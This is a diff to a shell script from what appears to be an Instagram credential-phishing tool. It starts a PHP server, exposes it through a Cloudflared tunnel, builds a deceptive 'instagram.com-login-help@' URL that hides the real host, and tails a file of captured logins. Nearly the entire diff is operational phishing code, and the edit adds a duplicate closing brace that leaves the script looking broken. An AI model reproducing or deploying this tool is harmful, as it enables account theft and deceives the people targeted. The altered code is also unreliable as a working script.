@@ -102,18 +102,25 @@ fi
 start_cloudflared() {
   echo -e "${GRN}[+] Starting PHP server...${NC}"
   php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+  sleep 2
+
   echo -e "${GRN}[+] Starting Cloudflared tunnel...${NC}"
   ./cloudflared tunnel --url http://localhost:8080 > cloudflared.log 2>&1 &
-  sleep 3
-  CLOUDFLARE_URL=$(grep -o 'https://[-0-9a-z]*.trycloudflare.com' cloudflared.log)
+  sleep 8  # Wait longer to allow Cloudflared to fully start
+
+  CLOUDFLARE_URL=$(grep -m 1 -o 'https://[-a-zA-Z0-9.]*\.trycloudflare\.com' cloudflared.log)
 
   if [ ! -z "$CLOUDFLARE_URL" ]; then
+    MASKED_URL="https://instagram.com-login-help@${CLOUDFLARE_URL#https://}"
     echo -e "${GRN}[+] Cloudflared URL: $CLOUDFLARE_URL${NC}"
+    echo -e "${CYAN}[+] Masked URL: $MASKED_URL${NC}"
     echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
     tail -f login.txt 2>/dev/null
   else
     echo -e "${RED}[!] Failed to get Cloudflared URL. Check logs.${NC}"
+    tail -n 10 cloudflared.log
   fi
+}
 }
 
 # Main Menu
